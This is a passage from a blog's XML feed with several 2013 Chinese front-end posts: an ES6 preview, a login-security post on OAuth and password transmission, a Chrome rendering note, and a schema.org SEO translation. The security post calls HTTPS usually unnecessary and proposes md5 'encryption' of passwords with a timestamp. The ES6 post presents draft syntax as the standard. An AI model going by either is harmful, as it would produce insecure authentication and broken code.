        <content type="html"><![CDATA[<p>ECMAScript 6 是JavaScript的下一个标准，正处在快速开发之中，大部分已经完成了，预计将在2014年正式发布。Mozilla将在这个标准的基础上，推出JavaScript 2.0。</p><p>ECMAScript 6 的目标，是使得JavaScript可以用来编写复杂的应用程序、函数库和代码的自动生成器（code generator）。</p><p>最新的浏览器已经部分支持ECMAScript 6 的语法，可以通过<a href="http://kangax.github.io/es5-compat-table/es6/" target="_blank">《ECMAScript 6 浏览器兼容表》</a>查看浏览器支持情况。</p><h3>ECMAScript 6 新内容一览</h3><ol><li><p><strong>let, const</strong> (定义块级局部变量), 函数在块级域中</p></li><li><p><strong>解构</strong>: <code>let &#123;x, y&#125; = pt; let [s, v, o] = triple();</code> (如可以 <code>let pt = &#123;x:2, y:-5&#125;</code>).</p></li><li><p><strong>参数设置默认设置</strong>: <code>function f(x, y=1, z=0) &#123;...&#125;</code></p></li><li><p><strong>rest</strong>: <code>function g(i, j, ...r) &#123; return r.slice(i, j); &#125;</code> (而不是疯狂地使用arguments).</p></li><li><p><strong>spread</strong>: <code>let a = [0,1,2,3]</code>, <code>o = new Something(...a);</code></p></li><li><p><strong>proxies</strong>: <code>let obj = Proxy.create(handler, proto)</code>. 简单地说，就是类对象元素的符号重载.</p></li><li><p><strong>weak map</strong>: <code>let map = new WeakMap</code>. 当你有循环应用的时候用它.</p></li><li><p><strong>generators</strong>: <code>function* gen() &#123; yield 1; yield 2; &#125;</code> 事实上, gen() 返回一个有next()属性的对象</p></li><li><p><strong>迭代器</strong>: <code>for (var [key, val] of items(x)) &#123; alert(key + ',' + val); &#125;</code>. Iterators 可以是 generators 或者 proxies.</p></li><li><p><strong>array and generator comprehension</strong>: <code>[a+b for (a in A) for (b in B)]</code> (array comprehension), <code>(x for (x of generateValues()) if (x.color === 'blue'))</code> (generator expression).</p></li><li><p><strong>二进制数据</strong>: <code>const Pixel = new StructType(&#123;x:uint32, y:uint32, color:Color&#125;)</code> (此处Color本身就是一个结构类型), <code>new ArrayType(Pixel, 3)</code>.</p></li><li><p><strong>类语法</strong>, 包含 <code>extends</code>, <code>prototype</code>, and <code>super</code>:</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> <span class="title">extends</span> <span class="title">Base</span> &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(x,y) &#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>[px] = x, <span class="keyword">this</span>[py] = y;</span><br><span class="line">    <span class="keyword">this</span>.r = function() &#123; <span class="keyword">return</span> Math.sqrt(x*x + y*y); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span> x() &#123; <span class="keyword">return</span> <span class="keyword">this</span>[px]; &#125;</span><br><span class="line">  <span class="keyword">get</span> y() &#123; <span class="keyword">return</span> <span class="keyword">this</span>[py]; &#125;</span><br><span class="line">  proto_r() &#123; <span class="keyword">return</span> Math.sqrt(<span class="keyword">this</span>[px] * <span class="keyword">this</span>[px] +</span><br><span class="line">      <span class="keyword">this</span>[py] * <span class="keyword">this</span>[py]); &#125;</span><br><span class="line">  equals(p) &#123; <span class="keyword">return</span> <span class="keyword">this</span>[px] === p[px] &amp;&amp;</span><br><span class="line">      <span class="keyword">this</span>[py] === p[py]; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>&nbsp;<strong>模块</strong>:<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">module math &#123;</span><br><span class="line">  export <span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">  export <span class="keyword">var</span> <span class="literal">pi</span> = <span class="number">3.141593</span>;</span><br><span class="line">&#125;</span><br><span class="line">import &#123;<span class="built_in">sum</span>, <span class="literal">pi</span>&#125; from math;</span><br><span class="line">alert(<span class="built_in">sum</span>(<span class="literal">pi</span>,<span class="literal">pi</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><strong>quasis</strong>: multiline, 可扩展的预处理字符串. <code><code>You are $&#123;age&#125; years old.</code></code><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The following regexp spans multiple lines.</span></span><br><span class="line">re`li<span class="symbol">ne1</span>: <span class="comment">(words )</span>*</span><br><span class="line">li<span class="symbol">ne2</span>: \w+`</span><br><span class="line"></span><br><span class="line"><span class="comment">// It desugars to:</span></span><br><span class="line">re<span class="comment">(&#123;raw:&#x27;line1: (words )</span>*\<span class="symbol">nline2</span>: \w+<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    cooked:&#x27;</span>li<span class="symbol">ne1</span>: <span class="comment">(words )</span>*\<span class="symbol">nline2</span>: \w+<span class="string">&#x27;&#125;)&amp;nbsp;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></li></ol><h3>参考资料</h3><ul><li><a href="http://espadrine.github.io/New-In-A-Spec/es6/">http://espadrine.github.io/New-In-A-Spec/es6/</a> espadrine</li><li><a href="http://javascript.ruanyifeng.com/oop/ecmascript6.html">http://javascript.ruanyifeng.com/oop/ecmascript6.html</a> ruanyifeng</li></ul><p>后续文章将陆续详细介绍上述新特性。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OAuth认证原理及HTTP下的密码安全传输</title>
      <link href="/blog/2013/11/26/cb-authentication-in-web/"/>
      <url>/blog/2013/11/26/cb-authentication-in-web/</url>
      
        <content type="html"><![CDATA[<p>很多人都会问这样一个问题，我们在登录的时候，密码会不会泄露？随便进一个网站，登录时抓包分析，可以看到自己的密码都是明文传输的，在如此复杂的web环境下，我们没有百分的把握保证信息在传输过程中不被截获，那不使用明文如何告诉服务器自己的身份呢？</p><p>在一些高度通信安全的网络中，数据传输会使用HTTPS作为传输协议，但是通常情况下我们没必要使用HTTPS传输，虽说安全，但传输数据都需要加密解密，很费时。我们可以使用一些加密方式（如md5）对密码进行加密，如果仅仅只对密码加密那肯定是没有任何作用，所以可以在密码中加入一些其他的字符，合并之后使这个密码成为一个临时密码~</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;uid&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;pwd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title class_">Date</span>*<span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">        uid = $(<span class="string">&quot;#uid&quot;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">        pwd = $(<span class="string">&quot;#pwd&quot;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">        delta = <span class="title function_">encrypt</span>($(<span class="string">&quot;#pwd&quot;</span>).<span class="title function_">val</span>() + t);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">post</span>(<span class="string">&quot;./login.php&quot;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">uid</span>: $(<span class="string">&quot;#uid&quot;</span>).<span class="title function_">val</span>(),</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">pwd</span>: delta,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">tid</span>: t</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//do something.</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面，提交表单的时候，pwd并不是真实的密码，他是pwd与t混合再加密的字符串。这样的字符串即便是被人截获也是一个无效的数据，即便是截获并知道了破解方式，我们还可以在后台给他设定一个时效限制。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&quot;uid&quot;</span>, <span class="string">&quot;user-A&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;user-A-pwd&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">time</span>() - <span class="variable">$_POST</span>[<span class="string">&#x27;tid&#x27;</span>] &gt; <span class="number">60</span>*<span class="number">2</span> ||</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;uid&#x27;</span>] !== uid ||</span><br><span class="line">    <span class="title function_ invoke__">decrypt</span>(pwd . <span class="variable">$_POST</span>[<span class="string">&#x27;tid&#x27;</span>]) !== <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果下面三个条件有一个不满足就报错</p><ul><li>时间超过2分钟</li><li>uid不匹配</li><li>pwd与t的组合密码不匹配</li></ul><p>当然，上面提到的encrypt和decrypt都是约定好的加密和解密方式，通常会使用md5加密。</p><p>这样的加密传输方式，需要客户端和服务器端的时间比较准确。如果要考虑时间不准确问题以及hacker动作迅速的问题，那就得用token来验证了。</p><p>所谓的token，其实就是在登录之前向服务器发送一个请求，获取准入的一个临时密码，这个临时密码是由服务器给出，所以不存在上面所说的时间不准确问题，同时这个token也是一个随机的字符串，只能单次使用，hacker很难获取，即便获取也无法使用，因为下一步登录所需的信息他没有。</p><p>很多童鞋都用过人人、QQ、微博的开发平台，其中OAuth认证也就是这个原理。就拿人人开发平台的认证来说，他的认证流程是这样的：&nbsp;</p><p><img src="https://images.cnitblog.com/blog/387325/201311/26144042-63a32b86b7574f06adb31c99a39b4316.png" alt="renren"></p><p>通过你在平台申请的API KEY向//graph.renren.com/oauth/authorize请求一个临时密码，也就是token code，然后利用token code向//graph.renren.com/oauth/token请求用户数据。整个流程十分简单。</p><p>这是一个简单的demo，获取你的头像和姓名。<a href="http://qianduannotes.duapp.com/renren/enter.html" target="_blank">人人OAuth认证demo</a></p><p>使用token的弊端是需要额外发送一次请求，过程稍微复杂。有些公司VPN通道就是利用token做密码，为了保证高安全性，他们使用的是一个信息与服务器同步硬件设备，和银行发的动态口令一样，每次登陆都需要输入这个口令，那这个口令也就是token，不过他不是网络传输获取，所以安全性更高。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chrome浏览器渲染白屏问题剖析</title>
      <link href="/blog/2013/11/04/cb-white-screen-in-chrome/"/>
      <url>/blog/2013/11/04/cb-white-screen-in-chrome/</url>
      
        <content type="html"><![CDATA[<p>刚截图十几次，终于捕捉到了这个白屏现象，hiahia~~</p><p><img src="https://images.cnitblog.com/blog/387325/201311/04131830-4cf27759a6e8428786bc2edd4fc9a479.jpg" alt="" width="855" height="445"></p><p>大家可以很清晰地看到下边还木有渲染完毕的透明层，这是一个十分普遍的问题，经常遇到。我的浏览器版本是</p><p><img src="https://images.cnitblog.com/blog/387325/201311/04131852-5b23b655bc6945fa9b44a2ec30477970.jpg" alt=""></p><p>到目前为止应该是最新版(release版本)，之前的版本应该也存在类似的问题。只要处理好代码，这种体验相当不好的白屏问题是可以避免的，Qzone的页面貌似就没有这个现象。首先我们来聊一聊这个问题是怎么产生的，这涉及到chrome浏览器对网页的解析和渲染。</p><blockquote><p>渲染引擎首先通过网络获得所请求文档的内容，通常<strong>以8K分块的方式</strong>完成。下面是渲染引擎在取得内容之后的基本流程：解析html以<strong>构建dom树-&gt;构建render树-&gt;布局render树-&gt;绘制render树</strong></p><p><img src="https://images.cnitblog.com/blog/387325/201311/04131906-c540e43cdc124640987ac5c4830fbe43.png" alt=""></p></blockquote><p>　　渲染引擎开始解析html，并将标签转化为内容树中的dom节点。接着，它解析外部CSS文件及style标签中的样式信息。这些样式信息以及html中的可见性指令将被用来构建另一棵树&mdash;&mdash;render树。</p><p>　　Render树由一些包含有颜色和大小等属性的矩形组成，它们将被按照正确的顺序显示到屏幕上。</p><p>　　Render树构建好了之后，将会执行布局过程，它将确定每个节点在屏幕上的确切坐标。再下一步就是绘制，即遍历render树，并使用UI后端层绘制每个节点。</p><p>　　值得注意的是，这个过程是逐步完成的，为了更好的用户体验，渲染引擎将会尽可能早的将内容呈现到屏幕上，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。</p><p>　　如果我们在Render树未完全绘制并渲染之前，向下快速拖动滚动条会看到上图所示的白屏现象。那这种现象可以通过什么方式来处理呢？应该说这是避免不了的，我们能做的就是：</p><ul><li>遵循XHTML编码规则，错误的标签在解析的过程中，浏览器需要花费很多时间去进行容错处理（一些push和pop操作），会在构建DOM树的时间花掉额外的时间。</li><li>优化HTML代码，减少代码层次（有些网站堆砌一二十层标签的做法实在是没法不让人吐槽）<img src="https://images.cnitblog.com/blog/387325/201311/04131918-9b6922039228486a849672bbf9a64739.jpg" alt=""></li><li>优化css，减少样式计算所需要的时间，<code>div div div div｛...｝</code>，尽量不要出现这么复杂的选择符。</li><li>尽量不要使用 <code>document.write</code>，html不能被自顶向下或自底向上地被解析，一种重要的原因也是因为脚本标签中含有这个所导致的，他可能会添加标签。</li><li>缩短第一屏的内容，后几屏的内容用js异步+判断滚动条动作载入，减少构建Render树和布局render树的时间</li></ul><p>关于浏览器的工作原理，有兴趣的可以上网<a href="//www.google.com.hk/search?q=%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86" target="_blank">搜搜</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEO：让搜索引擎对你的网站更有亲和力(译)</title>
      <link href="/blog/2013/11/01/cb-let-your-page-understood-by-search-engine/"/>
      <url>/blog/2013/11/01/cb-let-your-page-understood-by-search-engine/</url>
      
        <content type="html"><![CDATA[<p><span>人可以通过查看网站信息了解网站的内容，但是搜索引擎只对标签感兴趣，对内容的识别能力是很低的，如何让蜘蛛通过标签认识你的文章内容呢~</span></p><blockquote><p>原文网址：<a href="http://schema.org/docs/gs.html">http://schema.org/docs/gs.html</a>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/let-your-page-understood-by-search-engine.html">http://www.cnblogs.com/hustskyking/p/let-your-page-understood-by-search-engine.html</a>译者：<a href="http://www.cnblogs.com/hustskyking/" target="_blank">Barret Lee</a>日期：2013-11-01</p></blockquote><p>许多站长应该对HTML标签十分熟悉，HTML标签告诉浏览器如何去呈现标签的内容，比如<code>&lt;h1&gt;阿凡达&lt;/h1&gt;</code>，告诉浏览器用大标题的形式显示\阿凡达"。但是，HTML标签本身并没有给出任何信息标识其中的内容，因此搜索引擎也无法智能地将相关的信息呈现给用户。</p><p><a href="http://schema.org" target="_blank">Schema.org</a>提供了一些相关的词汇，开发者可以用这些词汇嵌入到HTML内容中来强化内容，以便更容易被Google、Microsoft、Yandex以及Yahoo等搜索引擎识别。</p><h3>一、如何使用元数据(microdata)来表示内容</h3><h4>1.为什么使用元数据</h4><p>人去阅读文章可以马上理解网页的相关内容，但是机器理解能力是十分有限的，给你的网页HTML添加一些额外的标签，让这些标签去告诉搜索引擎，\嘿，我描述的是一部电影，一个景点，一位名人或者一首音乐"，这样你就能让搜索引擎理解文章内容，并且让他在搜索结果中可以显示更多相关的内容。<strong>元数据</strong>是HTML5中的一些标签，他可以让你实现上述功能。</p><h4>2.itemscope和itemtype</h4><p>先举个简单的例子，比如你要显示\阿凡达"这部电影，包括这部电影的导演、类型，介绍，你的HTML代码可能会写成这样：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>阿凡达<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>导演: James Cameron (生于16-08-1954)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>科幻电影<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/path/to/obj.html&quot;</span>&gt;</span>Trailer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>刚开始我们来表示这一块是一个关于电影阿凡达的章节，我们需要给HTML添加itemscope属性</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>阿凡达<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>导演: James Cameron (生于16-08-1954)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>科幻电影<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/path/to/obj.html&quot;</span>&gt;</span>Trailer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过添加itemscope属性，搜索引擎就知道了这个div块表示的是一个特定的内容。为了让这个内容更加具体，我们可以继续添加一个itemtype属性</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>=<span class="string">&quot;&quot;</span> <span class="attr">itemtype</span>=<span class="string">&quot;http://schema.org/Movie&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>阿凡达<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>导演: James Cameron (生于16-08-1954)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>科幻电影<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/path/to/obj.html&quot;</span>&gt;</span>Trailer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样蜘蛛就知道了这块的内容是介绍一部电影了。</p><h4>3.itemprop</h4><p>我们还能为搜索引擎提供什么其他的信息？电影有一些属性，如主演，导演，评分等。为了表示这些属性，我们可以使用itemprop：</p><div class="highlight"><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>=<span class="string">&quot;&quot;</span> <span class="attr">itemtype</span>=<span class="string">&quot;http://schema.org/Movie&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">itemprop</span>=<span class="string">&quot;name&quot;</span>&gt;</span>阿凡达<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>导演: <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;director&quot;</span>&gt;</span>James Cameron<span class="tag">&lt;/<span class="name">span</span>&gt;</span> (生于16-08-1954)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;genre&quot;</span>&gt;</span>科幻电影<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/path/to/obj.html&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;trailer&quot;</span>&gt;</span>Trailer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h4>4.内嵌一个itemscope</h4><p>有时候作为一个itemprop的属性也可以单独出来成为itemscope，比如导演，他是属于Person，Person也有很多诸如名字，生日等属性。</p><div class="highlight"><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span>=<span class="string">&quot;&quot;</span> <span class="attr">itemtype</span>=<span class="string">&quot;http://schema.org/Movie&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">itemprop</span>=<span class="string">&quot;name&quot;</span>&gt;</span>阿凡达<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">itemprop</span>=<span class="string">&quot;director&quot;</span> <span class="attr">itemscope</span>=<span class="string">&quot;&quot;</span> <span class="attr">itemtype</span>=<span class="string">&quot;http://schema.org/Person&quot;</span>&gt;</span></span><br><span class="line">        导演: <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;name&quot;</span>&gt;</span>James Cameron<span class="tag">&lt;/<span class="name">span</span>&gt;</span> (生于 <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;birthDate&quot;</span>&gt;</span>16-08-1954<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;genre&quot;</span>&gt;</span>科幻电影<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/path/to/obj.html&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;trailer&quot;</span>&gt;</span>Trailer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3>二、使用 schema.org 提供的属性</h3><h4>1.schema.org 提供的类型和属性</h4><p>并不是所有的网页都是关于电影和人物介绍的，除了上面我们说到的Movies和Person之外，<a href="http://schema.org">schema.org</a>还提供了一系列的类型，以及这些类型对应的属性。</p><p>用的最多的是Thing这个类型，他有四个属性，name、description、url、image。这个类型对很多内容都实用。下面是一些常用的类型和属性：</p><ul><li>Creative works: <a href="http://schema.org/CreativeWork" target="_blank">CreativeWork</a>, <a href="http://schema.org/Book" target="_blank">Book</a>, <a href="http://schema.org/Movie" target="_blank">Movie</a>, <a href="http://schema.org/MusicRecording" target="_blank">MusicRecording</a>, <a href="http://schema.org/Recipe" target="_blank">Recipe</a>, <a href="http://schema.org/TVSeries" target="_blank">TVSeries</a> ...</li><li>Embedded non-text objects: <a href="http://schema.org/AudioObject" target="_blank">AudioObject</a>, <a href="http://schema.org/ImageObject" target="_blank">ImageObject</a>, <a href="http://schema.org/VideoObject" target="_blank">VideoObject</a></li><li><a href="http://schema.org/Event" target="_blank">Event</a></li><li><a href="http://schema.org/Organization" target="_blank">Organization</a></li><li><a href="http://schema.org/Person" target="_blank">Person</a></li><li><a href="http://schema.org/Place" target="_blank">Place</a>, <a href="http://schema.org/LocalBusiness" target="_blank">LocalBusiness</a>, <a href="http://schema.org/Restaurant" target="_blank">Restaurant</a> ...</li><li><a href="http://schema.org/Product" target="_blank">Product</a>, <a href="http://schema.org/Offer" target="_blank">Offer</a>, <a href="http://schema.org/AggregateOffer" target="_blank">AggregateOffer</a></li><li><a href="http://schema.org/Review" target="_blank">Review</a>, <a href="http://schema.org/AggregateRating" target="_blank">AggregateRating</a></li></ul><p>这里有一个对类型的列表，<a href="http://schema.org/docs/full.html" target="_blank">戳我</a>。//<span class="barretSay"><strong>Barret Say</strong>：schema给出的列表是规范统一的，对于你要用到的类，他基本上都有定义，不要自己构造他没有提到的类型。试想一下，如果每个人都给自己的内容定义多个类型，那搜索引擎该根据哪个标准来分类了，其结果就跟没有分类是一样的。</span></p><h4>2.期望的类型，文字和URL地址</h4><p>使用schema.org来标记你的网页时，有几点要注意：</p><ul><li><strong>除了隐藏的文字，标记越多越好</strong>， 一般来说，给你的文章做越多这样的标记，搜索引擎就越对你的文字有亲和力。但是一定要注意，只标记那些人们看得见的文字，不要标记那些隐藏的文字。</li><li><strong>使用类型标注而不是文字</strong>，很多地方我们可以使用itemscope去标注他的内容，尽量少让那些干巴巴的文字放置在哪里。</li><li><strong>使用URL属性</strong>，比如我的博客首页有很多文章列表，对列表中的每一篇文章都应用URL的itemscope标记，这样效果会比较好</li></ul><h4>3.测试你的标记</h4><p>Google提供了许多相关的测试工具来测试这些schema标记语法，比如这个：<a href="//support.google.com/webmasters/answer/146645?hl=zh-Hans" target="_blank">google webmasters</a>，你可以用这些工具来检测格式是不是正确。</p><h3>三、进阶话题：机器可理解的版本信息</h3><p>许多页面可以用itemscope，itemtype以及itemprop来定义，但是有的时候，如果不加另外的注释，搜索引擎是很难理解某些属性的：</p><ul><li>日期, 时间等: 使用时间标签 datetime</li><li>枚举以及引用等: 使用链接标签 href</li><li>缺失以及隐含的信息: 使用meta标签 content.</li></ul><h4>1.时间，日期</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;time datetime=<span class="string">&quot;2011-04-01&quot;</span>&gt;</span><span class="attribute">04</span>/<span class="number">01</span>/<span class="number">11</span>&lt;/time&gt;</span><br><span class="line"><span class="section">&lt;time datetime=<span class="string">&quot;2011-05-08T19:30&quot;</span>&gt;</span><span class="attribute">May</span> <span class="number">8</span>, <span class="number">7</span>:<span class="number">30</span>pm&lt;/time&gt;</span><br><span class="line"><span class="section">&lt;time itemprop=<span class="string">&quot;cookTime&quot;</span> datetime=<span class="string">&quot;PT1H30M&quot;</span>&gt;</span><span class="attribute">1</span> <span class="number">1</span>/<span class="number">2</span> hrs&lt;/time&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于这些时间日期格式化的规范，请参看：<a href="http://en.wikipedia.org/wiki/ISO_8601">ISO 8601 date/time standard</a>。</p><h4>2.枚举以及引用等</h4><h4>3.缺失以及隐含的信息</h4><p>因后面几个用的比较少，如果要做具体了解，请移步<a href="http://schema.org/docs/gs.html" target="_blank">原网页</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 译文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习的那些往事</title>
      <link href="/blog/2013/10/31/cb-learning-in-front-end/"/>
      <url>/blog/2013/10/31/cb-learning-in-front-end/</url>
      
